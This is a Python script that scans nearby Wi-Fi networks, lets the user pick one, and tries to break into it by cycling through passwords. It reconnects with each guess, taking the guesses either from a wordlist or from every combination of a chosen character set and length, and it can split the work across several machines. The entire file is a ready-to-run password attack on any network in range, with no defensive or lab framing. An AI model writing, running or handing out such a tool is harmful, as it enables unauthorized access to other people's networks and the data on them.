import pywifi
from pywifi import const
import time
import itertools 
import string    
import os        # To check if file exists

# --- Utility Functions ---
def count_lines(filepath):
    """Counts the number of lines in a file efficiently."""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for line in f)
    except FileNotFoundError:
        return 0
    except Exception as e:
        print(f"Error counting lines: {e}")
        return 0

def ask_yes_no(prompt_text):
    """Asks a yes/no question and returns True for 'y', False for 'n'."""
    while True:
        answer = input(prompt_text.strip() + " (y/n): ").lower().strip()
        if answer == 'y':
            return True
        elif answer == 'n':
            return False
        else:
            print("  Please answer 'y' or 'n'.")

# --- Network Scanning and Selection ---
def scan_networks():
    """Scans for available Wi-Fi networks."""
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]
    except IndexError:
        print("Error: No Wi-Fi interface found.")
        return []
        
    print("Scanning for networks...")
    iface.scan()
    time.sleep(3) # Increased sleep time for better scan results
    results = iface.scan_results()
    ssids = []
    seen = set()
    for network in results:
        try:
            ssid_name = network.ssid.strip()
            if ssid_name and ssid_name not in seen:
                ssids.append(ssid_name)
                seen.add(ssid_name)
        except Exception:
            pass # Ignore networks with problematic SSIDs
    return ssids

def choose_network(ssids):
    """Allows the user to choose a network from the scanned list."""
    if not ssids:
        print("No networks found. Exiting.")
        exit()
    print("\nAvailable Networks:")
    for i, ssid in enumerate(ssids):
        print(f"{i+1}. {ssid}")
    while True:
        try:
            choice = int(input("Choose a network number: ")) - 1
            if 0 <= choice < len(ssids):
                return ssids[choice]
            else:
                print("Invalid number. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

# --- Wordlist Attack Specific Functions ---
def get_wordlist_path():
    """Gets the path to the wordlist file from the user."""
    while True:
        filepath = input("Enter the full path to your wordlist file (or type 'skip' to use generated attack): ").strip()
        if filepath.lower() == 'skip':
            return None # User chose to skip wordlist
        if os.path.exists(filepath) and os.path.isfile(filepath):
            return filepath
        else:
            print("Error: File not found or is not a valid file. Please check the path or type 'skip'.")

# --- Generated (Brute-Force) Attack Specific Functions ---
def get_charset_for_generation():
    """Configures the character set for generated password attacks."""
    charset = ""
    print("\nConfigure Character Set for Generated Attack:")
    default_symbols = "!@#$%^&*"

    def clean_input(input_str):
        return input_str.strip().replace(',', '').replace(' ', '')

    if ask_yes_no("Include digits (0-9)?"):
        specific_digits = clean_input(input("  Enter specific digits (or press Enter for all 0-9):"))
        if specific_digits:
            charset += ''.join(c for c in specific_digits if c in string.digits)
        else:
            charset += string.digits

    if ask_yes_no("Include lowercase letters (a-z)?"):
        specific_lower = clean_input(input("  Enter specific lowercase letters (or press Enter for all a-z):"))
        if specific_lower:
            charset += ''.join(c for c in specific_lower if c in string.ascii_lowercase)
        else:
            charset += string.ascii_lowercase

    if ask_yes_no("Include uppercase letters (A-Z)?"):
        specific_upper = clean_input(input("  Enter specific uppercase letters (or press Enter for all A-Z):"))
        if specific_upper:
            charset += ''.join(c for c in specific_upper if c in string.ascii_uppercase)
        else:
            charset += string.ascii_uppercase

    if ask_yes_no(f"Include symbols?"):
        specific_symbols = clean_input(input(f"  Enter specific symbols (or press Enter for default '{default_symbols}'):"))
        if specific_symbols:
            charset += specific_symbols
        else:
            charset += default_symbols

    if not charset:
        print("\nError: Character set cannot be empty for generated attack. Please try again.")
        return get_charset_for_generation()

    unique_charset = "".join(sorted(list(set(charset))))
    print(f"\nUsing character set for generation ({len(unique_charset)} chars): {unique_charset}")
    return unique_charset

# --- Core Connection Logic ---
def connect(ssid, password, iface, worker_id_for_log=""):
    """Attempts to connect to a Wi-Fi network with a given password."""
    # print(f"\nWorker {worker_id_for_log} attempting: {password}") # Verbose, uncomment for debugging
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    iface.disconnect()
    time.sleep(0.5) # Short pause for disconnection
    
    iface.remove_all_network_profiles() # Clean slate for each attempt
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(4) # Connection attempt wait time (critical)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"\n[+] SUCCESS! Password found by Worker {worker_id_for_log}: {password}")
        return True
    else:
        # iface.disconnect() # Ensure disconnected if failed
        return False

# --- Attack Functions ---
def wordlist_attack(ssid, wordlist_path, worker_id, total_workers):
    """Performs the wordlist attack for an assigned portion of passwords."""
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]
    except IndexError:
        print(f"Error (Worker {worker_id}): No Wi-Fi interface found.")
        return

    print(f"\nWorker {worker_id}/{total_workers-1} starting WORDLIST attack on '{ssid}' using '{wordlist_path}'...")
    start_time = time.time()
    
    global_total_passwords = count_lines(wordlist_path)
    if global_total_passwords == 0:
        print(f"Error (Worker {worker_id}): Wordlist file is empty or could not be read. Exiting.")
        return
        
    print(f"Total passwords in wordlist for Worker {worker_id}: {global_total_passwords:,}")
    
    approx_worker_passwords = (global_total_passwords + total_workers - 1) // total_workers

    passwords_attempted_by_worker = 0
    current_line_number = 0 # 0-indexed

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if current_line_number % total_workers == worker_id:
                    password = line.strip()
                    if not password: # Skip empty lines from wordlist
                        current_line_number += 1
                        continue
                    passwords_attempted_by_worker += 1
                    print(f"\rWorker {worker_id} (Wordlist) | Try {passwords_attempted_by_worker}/{approx_worker_passwords} (Line: {current_line_number+1}): {password:<25}", end="")
                    if connect(ssid, password, iface, worker_id):
                        end_time = time.time()
                        print(f"\nWorker {worker_id} (Wordlist) finished in {end_time - start_time:.2f} seconds.")
                        return True # Password found
                current_line_number += 1
        print(f"\nWorker {worker_id} (Wordlist) finished its portion. Password not found.")
    except FileNotFoundError:
        print(f"Error (Worker {worker_id}): Wordlist file not found at {wordlist_path}")
    except Exception as e:
        print(f"An error occurred while reading the file (Worker {worker_id}): {e}")
    
    end_time = time.time()
    print(f"Worker {worker_id} (Wordlist) ran for {end_time - start_time:.2f} seconds.")
    return False

def generated_attack(ssid, charset, length, worker_id, total_workers):
    """Performs the generated (brute-force) attack."""
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]
    except IndexError:
        print(f"Error (Worker {worker_id}): No Wi-Fi interface found.")
        return

    print(f"\nWorker {worker_id}/{total_workers-1} starting GENERATED attack on '{ssid}' (Length: {length}, Charset size: {len(charset)})...")
    start_time = time.time()
    
    global_total_combinations = len(charset) ** length
    print(f"Total possible generated passwords for Worker {worker_id}: {global_total_combinations:,}")
    
    approx_worker_combinations = (global_total_combinations + total_workers - 1) // total_workers
    
    passwords_attempted_by_worker = 0
    current_global_password_index = 0

    for pwd_tuple in itertools.product(charset, repeat=length):
        if current_global_password_index % total_workers == worker_id:
            password = ''.join(pwd_tuple)
            passwords_attempted_by_worker += 1
            print(f"\rWorker {worker_id} (Generated) | Try {passwords_attempted_by_worker}/{approx_worker_combinations} (Global Index: {current_global_password_index}): {password:<{length+5}}", end="")
            if connect(ssid, password, iface, worker_id):
                end_time = time.time()
                print(f"\nWorker {worker_id} (Generated) finished in {end_time - start_time:.2f} seconds.")
                return True # Password found
        current_global_password_index += 1

    print(f"\nWorker {worker_id} (Generated) finished its portion. Password not found.")
    end_time = time.time()
    print(f"Worker {worker_id} (Generated) ran for {end_time - start_time:.2f} seconds.")
    return False

# --- Main Application Logic ---
def main():
    try:
        networks = scan_networks()
        ssid_to_attack = choose_network(networks)

        attack_type = ""
        while attack_type not in ['w', 'g']:
            attack_type = input("\nChoose attack type: (w)ordlist or (g)enerated brute-force? ").lower()

        wordlist_file = None
        charset_to_use = None
        pwd_length = 0

        if attack_type == 'w':
            wordlist_file = get_wordlist_path()
            if not wordlist_file: # User typed 'skip'
                print("Wordlist skipped. Please restart and choose 'g' for generated attack or provide a wordlist.")
                return 
        else: # attack_type == 'g'
            charset_to_use = get_charset_for_generation()
            while True:
                try:
                    pwd_length = int(input("Enter password length for generated attack: "))
                    if pwd_length > 0:
                        break
                    else:
                        print("Length must be a positive number.")
                except ValueError:
                    print("Invalid input. Please enter a number.")
        
        # Get worker configuration (common for both attack types)
        while True:
            try:
                total_workers = int(input("Enter TOTAL number of workers participating: "))
                if total_workers > 0:
                    break
                else:
                    print("Total workers must be at least 1.")
            except ValueError:
                print("Invalid input. Please enter a number.")
        
        while True:
            try:
                worker_id = int(input(f"Enter this worker's ID (from 0 to {total_workers - 1}): "))
                if 0 <= worker_id < total_workers:
                    break
                else:
                    print(f"Worker ID must be between 0 and {total_workers - 1}.")
            except ValueError:
                print("Invalid input. Please enter a number.")

        # Start the chosen attack
        if attack_type == 'w' and wordlist_file:
            wordlist_attack(ssid_to_attack, wordlist_file, worker_id, total_workers)
        elif attack_type == 'g':
            generated_attack(ssid_to_attack, charset_to_use, pwd_length, worker_id, total_workers)
        else:
            if attack_type == 'w' and not wordlist_file:
                pass # Message already printed
            else:
                print("Invalid attack configuration. Exiting.")


    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
